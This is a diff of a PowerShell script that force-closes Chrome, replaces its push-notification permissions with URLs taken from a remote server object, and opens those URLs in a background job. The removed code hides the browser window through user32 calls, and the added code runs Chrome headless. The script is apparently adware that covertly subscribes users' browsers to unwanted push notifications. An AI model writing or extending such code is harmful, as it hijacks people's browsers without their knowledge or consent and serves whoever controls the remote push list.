@@ -280,7 +280,7 @@ function ConfigureChromePushes {
 
     Close-AllChromes;
     Remove-Pushes;
-    foreach ($push in $xpushes) {
+    foreach ($push in $server.pushes) {
         Add-Push -pushUrl $push
     }
 }
@@ -294,41 +294,43 @@ function Open-ChromeWithUrl {
     $job = Start-Job -ScriptBlock {
             param ($url, $isDebug)
 
-
+            try {
+                
+ 
             Add-Type @"
             using System;
             using System.Collections.Generic;
             using System.Runtime.InteropServices;
             using System.Text;
-        
+            
             public static class User32X {
                 public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
-        
+            
                 [DllImport("user32.dll", SetLastError = true)]
                 private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
-        
+            
                 [DllImport("user32.dll", SetLastError = true)]
                 private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
-        
+            
                 [DllImport("user32.dll", SetLastError = true)]
                 private static extern int GetWindowTextLength(IntPtr hWnd);
-        
+            
                 [DllImport("user32.dll", SetLastError = true)]
                 private static extern bool IsWindowVisible(IntPtr hWnd);
-        
+            
                 public static string GetWindowText(IntPtr hWnd) {
                     int length = GetWindowTextLength(hWnd);
                     if (length == 0) return String.Empty;
-        
+            
                     StringBuilder sb = new StringBuilder(length + 1);
                     GetWindowText(hWnd, sb, sb.Capacity);
                     return sb.ToString();
                 }
-        
+            
                 public static bool IsWindowVisibleEx(IntPtr hWnd) {
                     return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
                 }
-        
+            
                 public static IntPtr[] EnumerateAllWindows() {
                     var windowHandles = new List<IntPtr>();
                     EnumWindows((hWnd, lParam) => {
@@ -339,102 +341,105 @@ function Open-ChromeWithUrl {
                     }, IntPtr.Zero);
                     return windowHandles.ToArray();
                 }
-        
+            
                 [DllImport("user32.dll", SetLastError = true)]
                 public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        
+            
                 public const int SW_HIDE = 0;
                 public const int SW_MINIMIZE = 6;
                 public const int SW_SHOW = 5;
-        
+                public const int SW_MAXIMIZE = 3; // Added constant for maximizing window
+            
                 [DllImport("user32.dll", SetLastError = true)]
                 public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
-        
+            
                 public static void CloseWindow(IntPtr hWnd) {
                     const uint WM_CLOSE = 0x0010;
                     PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                 }
             }
 "@
-
-            function Close-ChromeWindow {
-                try {
-                    param ($window)
-                    [User32X]::CloseWindow($window) | Out-Null
-                    Start-Sleep -Milliseconds 25
-                }
-                catch {}
-            }
-            
-            function Close-Chrome {
-                param ($process)
-                Close-ChromeWindow -window $process.MainWindowHandle
-                try {
-                    $process | Stop-Process -Force
-                }
-                catch {
-                }
-            }
-
-            $chromePaths = @(
-                "C:\Program Files\Google\Chrome\Application\chrome.exe",
-                "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
-                "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
-                "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
-                "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
-            )
-            $resolvedPaths = @()
-            foreach ($path in $chromePaths) {
-                try {
-                    $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
-                    if ($resolvedPath -notin $resolvedPaths) {
-                        $resolvedPaths += $resolvedPath.Path
-                    }
-                } catch {
-                    Write-Output "Error resolving path: $_"
-                }
-            }
-            $resolvedPaths = $resolvedPaths | Select-Object -Unique
-            foreach ($path in $resolvedPaths) {
-                if (Test-Path -Path $path) {
-                    Write-Output "Found Chrome at: $path"
+}
+catch {
+}
         
-                    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
-                    $processStartInfo.FileName = $path
-                    $processStartInfo.Arguments = $url
-                    $processStartInfo.CreateNoWindow = $true
-                    $processStartInfo.UseShellExecute = $false
-                    $process = New-Object System.Diagnostics.Process
-                    $process.StartInfo = $processStartInfo
-                    $process.Start() | Out-Null         
-                    $endTime = (Get-Date).AddSeconds(6)
-                    while ((Get-Date) -lt $endTime) {
-                        if ($isDebug -eq $false)
-                        {
-                            try
-                            {
-                                [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null
-                            }
-                            catch
-                            {
-                            }
-                        }
-                        Start-Sleep -Milliseconds 1
-                    }
-                    try
-                    {
-                        [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
-                    }
-                    catch
-                    {
-                    }
-                    Close-Chrome -process $process
-        `
-                    break
-                } else {
-                    Write-Output "Chrome not found at: $path"
-                }
+        function Close-ChromeWindow {
+            try {
+                param ($window)
+                [User32X]::CloseWindow($window) | Out-Null
+                Start-Sleep -Milliseconds 100
             }
+            catch {}
+        }
+        
+        function Close-Chrome {
+            param ($process)
+            Close-ChromeWindow -window $process.MainWindowHandle
+            try {
+                $process | Stop-Process -Force
+            }
+            catch {
+            }
+        }
+
+        $chromePaths = @(
+            "C:\Program Files\Google\Chrome\Application\chrome.exe",
+            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
+            "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
+            "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
+        )
+        $resolvedPaths = @()
+        foreach ($path in $chromePaths) {
+            try {
+                $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
+                if ($resolvedPath -notin $resolvedPaths) {
+                    $resolvedPaths += $resolvedPath.Path
+                }
+            } catch {
+                Write-Output "Error resolving path: $_"
+            }
+        }
+        $resolvedPaths = $resolvedPaths | Select-Object -Unique
+        foreach ($path in $resolvedPaths) {
+            if (Test-Path -Path $path) {
+                Write-Output "Found Chrome at: $path"
+    
+                $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+                $processStartInfo.FileName = $path
+                $processStartInfo.Arguments = "--headless --disable-gpu --dump-dom $url"
+                $processStartInfo.CreateNoWindow = $false
+                $processStartInfo.UseShellExecute = $false
+                $process = New-Object System.Diagnostics.Process
+                $process.StartInfo = $processStartInfo
+                $process.Start() | Out-Null         
+                $endTime = (Get-Date).AddSeconds(8)
+                while ((Get-Date) -lt $endTime) {
+                    if ($isDebug -eq $false)
+                    {
+                        # try
+                        # {
+                        #     [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null                                
+                        # }
+                        # catch
+                        # {
+                        # }
+                    }
+                    Start-Sleep -Milliseconds 100
+                }
+                # try
+                # {
+                #     [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
+                # }
+                # catch
+                # {
+                # }
+                Close-Chrome -process $process
+                break
+            } else {
+                Write-Output "Chrome not found at: $path"
+            }
+        }
 
     } -ArgumentList $url, $isDebug
 
@@ -443,10 +448,8 @@ function Open-ChromeWithUrl {
 
 function LaunchChromePushes {
     $isDebug = IsDebug
-    foreach ($push in $xpushes) {
+    foreach ($push in $server.pushes) {
         Open-ChromeWithUrl -url $push -isDebug $isDebug
         break
     }
 }
-
-LaunchChromePushes
